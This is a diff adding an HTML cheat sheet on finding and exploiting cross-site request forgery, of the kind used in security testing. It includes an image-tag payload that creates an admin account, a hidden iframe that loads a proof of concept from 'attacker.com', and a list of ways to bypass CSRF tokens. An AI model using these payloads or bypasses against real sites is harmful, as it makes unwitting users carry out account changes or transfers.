@@ -1,0 +1,56 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Manual</title>
+</head><body><span style="font-size: 12pt"><b>Detection</b><br/>
+</span><span style="font-size: 10pt"><br/>
+</span><b>Where to look</b><br/>
+<br/>
+Inspect forms which do sensitive operations or returns sensitive data.<br/>
+Inspect API endpoints which do sensitive operations or returns sensitive data.<br/>
+<br/>
+Find an application function that can be used to perform some sensitive action on behalf of an unwitting user.<br/>
+<ul><li>This function must validate authenticated user just by cookie</li>
+<li>Parameters must be known</li>
+</ul>
+<br/>
+Create HTML page which when accessed issues given GET or POST request automatically<br/>
+<ul><li>For GET requests use image tag</li>
+</ul>
+<ul><li style="list-style-type: none"><tt>&lt;img src=&quot;https://mdsec.net/auth/390/NewUserStep2.php?realname=daf&amp;username=daf&amp;userrole=admin&amp;password=letmein1&amp;confirmpassword=letmein1&quot;&gt;</tt></li>
+</ul>
+<ul><li>For POST request use hidden form which automatically submits itself</li>
+</ul>
+<br/>
+<br/>
+<b>Common functions names</b><br/>
+<tt><br/>
+</tt>Add / Upload file Email change<br/>
+Delete File<br/>
+Password change<br/>
+Transfer Money / Currency<br/>
+Profile edit<br/>
+<br/>
+<b><br/>
+</b><b>Delivery methods</b><br/>
+<ul><li>XSS</li>
+<li style="list-style-type: none"><ul><tt><li style="list-style-type: none">&lt;iframe src=&quot;http://attacker.com/csrfpoc.htm&quot; style=&quot;width:0;height:0;border:0; border:none;&quot;&gt;&lt;/iframe&gt;</li>
+</tt><li style="list-style-type: none"><tt>&lt;img src=&quot;www.malicious-site.com&quot;&gt;</tt></li>
+</ul>
+</li>
+<li>e-mail with HTML content</li>
+<li>embed into malicious attacker's page</li>
+</ul>
+<br/>
+<b>CSRF protection bypass</b><br/>
+<br/>
+Remove CSRF token from request<br/>
+Remove CSRF token parameter value<br/>
+Add bad control chars to CSRF parameter value<br/>
+Put a random string with a similar length to that of the anti-CSRF token.<br/>
+Use a second identical CSRF param<br/>
+Change POST to GET<br/>
+If currently logged in as user A then use the CSRF token of any other user B and check if the request of A is allowed via B's token.<br/>
+Check if the CSRF token is common to all users. If so, then use the token to construct an exploit.<br/>
+Predictable token value<br/>
+</body></html>
